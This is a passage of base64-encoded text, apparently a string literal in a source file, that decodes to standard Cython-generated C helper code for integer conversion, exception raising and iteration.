SElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAg""ICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKGludCktMSkqKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKCgoKChpbnQpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFr""OwogICAgICAgICAgICB9CiAgICAgICAgfQojZW5kaWYKICAgICAgICBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZihsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgbG9uZywgUHlMb25nX0FzTG9uZyh4KSkKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhpbnQsIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzTG9uZ0xvbmcoeCkpCiNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIHsKICAgICAgICBpbnQgdmFsOwogICAgICAgIGludCByZXQgPSAtMTsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTYgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBQeV9zc2l6ZV90IGJ5dGVzX2NvcGllZCA9IFB5TG9uZ19Bc05hdGl2ZUJ5dGVzKAogICAgICAgICAgICB4LCAmdmFsLCBzaXplb2YodmFsKSwgUHlfQVNOQVRJVkVCWVRFU19OQVRJVkVfRU5ESUFOIHwgKGlzX3Vuc2lnbmVkID8gUHlfQVNOQVRJVkVCWVRFU19VTlNJR05FRF9CVUZGRVIgfCBQeV9BU05BVElWRUJZVEVTX1JFSkVDVF9ORUdBVElWRSA6IDApKTsKICAgICAgICBpZiAodW5saWtlbHkoYnl0ZXNfY29waWVkID09IC0xKSkgewogICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoYnl0ZXNfY29waWVkID4gKFB5X3NzaXplX3QpIHNpemVvZih2YWwpKSkgewogICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93OwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldCA9IDA7CiAgICAgICAgfQojZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAgJiYgIShDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgfHwgZGVmaW5lZChfUHlMb25nX0FzQnl0ZUFycmF5KQogICAgICAgIGludCBvbmUgPSAxOyBpbnQgaXNfbGl0dGxlID0gKGludCkqKHVuc2lnbmVkIGNoYXIgKikmb25lOwogICAgICAgIHVuc2lnbmVkIGNoYXIgKmJ5dGVzID0gKHVuc2lnbmVkIGNoYXIgKikmdmFsOwogICAgICAgIHJldCA9IF9QeUxvbmdfQXNCeXRlQXJyYXkoKFB5TG9uZ09iamVjdCAqKXgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5dGVzLCBzaXplb2YodmFsKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfbGl0dGxlLCAhaXNfdW5zaWduZWQpOwojZWxzZQogICAgICAgIFB5T2JqZWN0ICp2OwogICAgICAgIFB5T2JqZWN0ICpzdGVwdmFsID0gTlVMTCwgKm1hc2sgPSBOVUxMLCAqc2hpZnQgPSBOVUxMOwogICAgICAgIGludCBiaXRzLCByZW1haW5pbmdfYml0cywgaXNfbmVnYXRpdmUgPSAwOwogICAgICAgIGludCBjaHVua19zaXplID0gKHNpemVvZihsb25nKSA8IDgpID8gMzAgOiA2MjsKICAgICAgICBpZiAobGlrZWx5KFB5TG9u""Z19DaGVja0V4YWN0KHgpKSkgewogICAgICAgICAgICB2ID0gX19QeXhfTmV3UmVmKHgpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHYgPSBQeU51bWJlcl9Mb25nKHgpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXYpKSByZXR1cm4gKGludCkgLTE7CiAgICAgICAgICAgIGFzc2VydChQeUxvbmdfQ2hlY2tFeGFjdCh2KSk7CiAgICAgICAgfQogICAgICAgIHsKICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh2LCBQeV9GYWxzZSwgUHlfTFQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih2KTsKICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAtMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpc19uZWdhdGl2ZSA9IHJlc3VsdCA9PSAxOwogICAgICAgIH0KICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkoaXNfbmVnYXRpdmUpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfSBlbHNlIGlmIChpc19uZWdhdGl2ZSkgewogICAgICAgICAgICBzdGVwdmFsID0gUHlOdW1iZXJfSW52ZXJ0KHYpOwogICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghc3RlcHZhbCkpCiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgc3RlcHZhbCA9IHY7CiAgICAgICAgfQogICAgICAgIHYgPSBOVUxMOwogICAgICAgIHZhbCA9IChpbnQpIDA7CiAgICAgICAgbWFzayA9IFB5TG9uZ19Gcm9tTG9uZygoMUwgPDwgY2h1bmtfc2l6ZSkgLSAxKTsgaWYgKHVubGlrZWx5KCFtYXNrKSkgZ290byBkb25lOwogICAgICAgIHNoaWZ0ID0gUHlMb25nX0Zyb21Mb25nKGNodW5rX3NpemUpOyBpZiAodW5saWtlbHkoIXNoaWZ0KSkgZ290byBkb25lOwogICAgICAgIGZvciAoYml0cyA9IDA7IGJpdHMgPCAoaW50KSBzaXplb2YoaW50KSAqIDggLSBjaHVua19zaXplOyBiaXRzICs9IGNodW5rX3NpemUpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnRtcCwgKmRpZ2l0OwogICAgICAgICAgICBsb25nIGlkaWdpdDsKICAgICAgICAgICAgZGlnaXQgPSBQeU51bWJlcl9BbmQoc3RlcHZhbCwgbWFzayk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGlnaXQpKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoZGlnaXQpOwogICAgICAgICAgICBQeV9ERUNSRUYoZGlnaXQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgdmFsIHw9ICgoaW50KSBpZGlnaXQpIDw8IGJpdHM7CiAgICAgICAgICAgIHRtcCA9IFB5TnVtYmVyX1JzaGlmdChzdGVwdmFsLCBzaGlmdCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdG1wKSkgZ290byBkb25lOwogICAg""ICAgICAgICBQeV9ERUNSRUYoc3RlcHZhbCk7IHN0ZXB2YWwgPSB0bXA7CiAgICAgICAgfQogICAgICAgIFB5X0RFQ1JFRihzaGlmdCk7IHNoaWZ0ID0gTlVMTDsKICAgICAgICBQeV9ERUNSRUYobWFzayk7IG1hc2sgPSBOVUxMOwogICAgICAgIHsKICAgICAgICAgICAgbG9uZyBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKHN0ZXB2YWwpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgcmVtYWluaW5nX2JpdHMgPSAoKGludCkgc2l6ZW9mKGludCkgKiA4KSAtIGJpdHMgLSAoaXNfdW5zaWduZWQgPyAwIDogMSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPj0gKDFMIDw8IHJlbWFpbmluZ19iaXRzKSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93OwogICAgICAgICAgICB2YWwgfD0gKChpbnQpIGlkaWdpdCkgPDwgYml0czsKICAgICAgICB9CiAgICAgICAgaWYgKCFpc191bnNpZ25lZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkodmFsICYgKCgoaW50KSAxKSA8PCAoc2l6ZW9mKGludCkgKiA4IC0gMSkpKSkKICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7CiAgICAgICAgICAgIGlmIChpc19uZWdhdGl2ZSkKICAgICAgICAgICAgICAgIHZhbCA9IH52YWw7CiAgICAgICAgfQogICAgICAgIHJldCA9IDA7CiAgICBkb25lOgogICAgICAgIFB5X1hERUNSRUYoc2hpZnQpOwogICAgICAgIFB5X1hERUNSRUYobWFzayk7CiAgICAgICAgUHlfWERFQ1JFRihzdGVwdmFsKTsKI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KHJldCkpCiAgICAgICAgICAgIHJldHVybiAoaW50KSAtMTsKICAgICAgICByZXR1cm4gdmFsOwogICAgfQpyYWlzZV9vdmVyZmxvdzoKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICJ2YWx1ZSB0b28gbGFyZ2UgdG8gY29udmVydCB0byBpbnQiKTsKICAgIHJldHVybiAoaW50KSAtMTsKcmFpc2VfbmVnX292ZXJmbG93OgogICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsCiAgICAgICAgImNhbid0IGNvbnZlcnQgbmVnYXRpdmUgdmFsdWUgdG8gaW50Iik7CiAgICByZXR1cm4gKGludCkgLTE7Cn0KCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSkgewogICAgUHlPYmplY3QqIG93bmVkX2luc3RhbmNlID0gTlVMTDsKICAgIGlmICh0YiA9PSBQeV9Ob25lKSB7CiAgICAgICAgdGIgPSAwOwogICAgfSBlbHNlIGlmICh0YiAmJiAhUHlUcmFjZUJhY2tfQ2hlY2sodGIpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgInJhaXNlOiBhcmcgMyBtdXN0IGJlIGEgdHJhY2ViYWNrIG9yIE5vbmUiKTsKICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lKQogICAg""ICAgIHZhbHVlID0gMDsKICAgIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHR5cGUpKSB7CiAgICAgICAgaWYgKHZhbHVlKSB7CiAgICAgICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAiaW5zdGFuY2UgZXhjZXB0aW9uIG1heSBub3QgaGF2ZSBhIHNlcGFyYXRlIHZhbHVlIik7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICB2YWx1ZSA9IHR5cGU7CiAgICAgICAgdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpOwogICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKHR5cGUpKSB7CiAgICAgICAgUHlPYmplY3QgKmluc3RhbmNlX2NsYXNzID0gTlVMTDsKICAgICAgICBpZiAodmFsdWUgJiYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHsKICAgICAgICAgICAgaW5zdGFuY2VfY2xhc3MgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHZhbHVlKTsKICAgICAgICAgICAgaWYgKGluc3RhbmNlX2NsYXNzICE9IHR5cGUpIHsKICAgICAgICAgICAgICAgIGludCBpc19zdWJjbGFzcyA9IFB5T2JqZWN0X0lzU3ViY2xhc3MoaW5zdGFuY2VfY2xhc3MsIHR5cGUpOwogICAgICAgICAgICAgICAgaWYgKCFpc19zdWJjbGFzcykgewogICAgICAgICAgICAgICAgICAgIGluc3RhbmNlX2NsYXNzID0gTlVMTDsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoaXNfc3ViY2xhc3MgPT0gLTEpKSB7CiAgICAgICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHR5cGUgPSBpbnN0YW5jZV9jbGFzczsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoIWluc3RhbmNlX2NsYXNzKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzOwogICAgICAgICAgICBpZiAoIXZhbHVlKQogICAgICAgICAgICAgICAgYXJncyA9IFB5VHVwbGVfTmV3KDApOwogICAgICAgICAgICBlbHNlIGlmIChQeVR1cGxlX0NoZWNrKHZhbHVlKSkgewogICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICAgICAgICAgIGFyZ3MgPSB2YWx1ZTsKICAgICAgICAgICAgfSBlbHNlCiAgICAgICAgICAgICAgICBhcmdzID0gUHlUdXBsZV9QYWNrKDEsIHZhbHVlKTsKICAgICAgICAgICAgaWYgKCFhcmdzKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgIG93bmVkX2luc3RhbmNlID0gUHlPYmplY3RfQ2FsbCh0eXBlLCBhcmdzLCBOVUxMKTsKICAgICAgICAgICAgUHlfREVDUkVGKGFyZ3MpOwogICAgICAgICAgICBpZiAoIW93bmVkX2luc3RhbmNlKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgIHZhbHVlID0gb3duZWRfaW5zdGFuY2U7CiAgICAgICAgICAgIGlmICghUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHsKICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1h""dChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNhbGxpbmcgJVIgc2hvdWxkIGhhdmUgcmV0dXJuZWQgYW4gaW5zdGFuY2Ugb2YgIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uLCBub3QgJVIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGUsIFB5X1RZUEUodmFsdWUpKTsKICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAicmFpc2U6IGV4Y2VwdGlvbiBjbGFzcyBtdXN0IGJlIGEgc3ViY2xhc3Mgb2YgQmFzZUV4Y2VwdGlvbiIpOwogICAgICAgIGdvdG8gYmFkOwogICAgfQogICAgaWYgKGNhdXNlKSB7CiAgICAgICAgUHlPYmplY3QgKmZpeGVkX2NhdXNlOwogICAgICAgIGlmIChjYXVzZSA9PSBQeV9Ob25lKSB7CiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gTlVMTDsKICAgICAgICB9IGVsc2UgaWYgKFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soY2F1c2UpKSB7CiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gUHlPYmplY3RfQ2FsbE9iamVjdChjYXVzZSwgTlVMTCk7CiAgICAgICAgICAgIGlmIChmaXhlZF9jYXVzZSA9PSBOVUxMKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKGNhdXNlKSkgewogICAgICAgICAgICBmaXhlZF9jYXVzZSA9IGNhdXNlOwogICAgICAgICAgICBQeV9JTkNSRUYoZml4ZWRfY2F1c2UpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZXhjZXB0aW9uIGNhdXNlcyBtdXN0IGRlcml2ZSBmcm9tICIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uIik7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBQeUV4Y2VwdGlvbl9TZXRDYXVzZSh2YWx1ZSwgZml4ZWRfY2F1c2UpOwogICAgfQogICAgUHlFcnJfU2V0T2JqZWN0KHR5cGUsIHZhbHVlKTsKICAgIGlmICh0YikgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNgogICAgICAgIFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayh2YWx1ZSwgdGIpOwojZWxpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgICAgICBQeVRocmVhZFN0YXRlICp0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7CiAgICAgICAgUHlPYmplY3QqIHRtcF90YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjazsKICAgICAgICBpZiAodGIgIT0gdG1wX3RiKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRih0Yik7CiAgICAgICAgICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IHRiOwogICAgICAgICAgICBQeV9YREVDUkVGKHRtcF90Yik7CiAgICAgICAgfQojZWxzZQogICAg""ICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjsKICAgICAgICBQeUVycl9GZXRjaCgmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpOwogICAgICAgIFB5X0lOQ1JFRih0Yik7CiAgICAgICAgUHlFcnJfUmVzdG9yZSh0bXBfdHlwZSwgdG1wX3ZhbHVlLCB0Yik7CiAgICAgICAgUHlfWERFQ1JFRih0bXBfdGIpOwojZW5kaWYKICAgIH0KYmFkOgogICAgUHlfWERFQ1JFRihvd25lZF9pbnN0YW5jZSk7CiAgICByZXR1cm47Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUEkodm9pZCkgewogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlKSkKICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25leHQpOwogICAgcmV0dXJuIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUElfY2FjaGU7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbihQeU9iamVjdCAqaXRlcmF0b3IpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDAKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBQeU9iamVjdCAqbmV4dCA9IF9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUEkoKTsKICAgIGlmICh1bmxpa2VseSghbmV4dCkpIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhuZXh0LCBpdGVyYXRvciwgTlVMTCk7CiAgICByZXR1cm4gcmVzdWx0OwojZWxzZQogICAgKHZvaWQpX19QeXhfR2V0QnVpbHRpbk5hbWU7IC8vIG9ubHkgZm9yIGVhcmx5IGxpbWl0ZWQgQVBJCiAgICBpdGVybmV4dGZ1bmMgaXRlcm5leHQgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoaXRlcmF0b3IpOwogICAgYXNzZXJ0KGl0ZXJuZXh0KTsKICAgIHJldHVybiBpdGVybmV4dChpdGVyYXRvcik7CiNlbmRpZgp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncyhQeU9iamVjdCogZnVuY3Rpb24sIFB5T2JqZWN0KiBhcmcxLCBQeU9iamVjdCogYXJnMikgewogICAgUHlPYmplY3QgKmFyZ3NbM10gPSB7TlVMTCwgYXJnMSwgYXJnMn07CiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuY3Rpb24sIGFyZ3MrMSwgMiB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7Cn0KCgojaWYg""IShDWVRIT05fVkVDVE9SQ0FMTCAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApCnN0YXRpYyBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKFB5T2JqZWN0KiBtZXRob2QsIFB5T2JqZWN0KiBhcmcpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKG1ldGhvZCwgYXJnKTsKICAgIFB5X0RFQ1JFRihtZXRob2QpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUsIFB5T2JqZWN0KiBhcmcpIHsKI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMAogICAgUHlPYmplY3QgKmFyZ3NbMl0gPSB7b2JqLCBhcmd9OwogICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZDsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnOwogICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJnczsKICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG1ldGhvZF9uYW1lLCBhcmdzLCAyIHwgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBOVUxMKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICptZXRob2QgPSBOVUxMLCAqcmVzdWx0OwogICAgaW50IGlzX21ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChvYmosIG1ldGhvZF9uYW1lLCAmbWV0aG9kKTsKICAgIGlmIChsaWtlbHkoaXNfbWV0aG9kKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncyhtZXRob2QsIG9iaiwgYXJnKTsKICAgICAgICBQeV9ERUNSRUYobWV0aG9kKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKSByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9fUHlPYmplY3RfQ2FsbE1ldGhvZDEobWV0aG9kLCBhcmcpOwojZW5kaWYKfQoKCnN0YXRpYyB2b2lkIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYyk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMsIGludCBpdGVybmV4dCkgewogICAgaWYgKHZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICBpZiAoYXN5bmMgfHwgIWl0ZXJuZXh0KQogICAgICAgICAgICBQeUVycl9TZXROb25lKGFzeW5jID8gUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uIDogUHlFeGNfU3RvcEl0ZXJhdGlvbik7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgX19QeXhfX1JldHVybldpdGhTdG9wSXRlcmF0aW9uKHZhbHVlLCBhc3luYyk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfX1JldHVybldpdGhTdG9wSXRlcmF0aW9uKFB5T2JqZWN0KiB2YWx1ZSwgaW50IGFzeW5jKSB7CiNp""ZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQojZW5kaWYKICAgIFB5T2JqZWN0ICpleGM7CiAgICBQeU9iamVjdCAqZXhjX3R5cGUgPSBhc3luYyA/IFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbiA6IFB5RXhjX1N0b3BJdGVyYXRpb247CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIGlmICgoUFlfVkVSU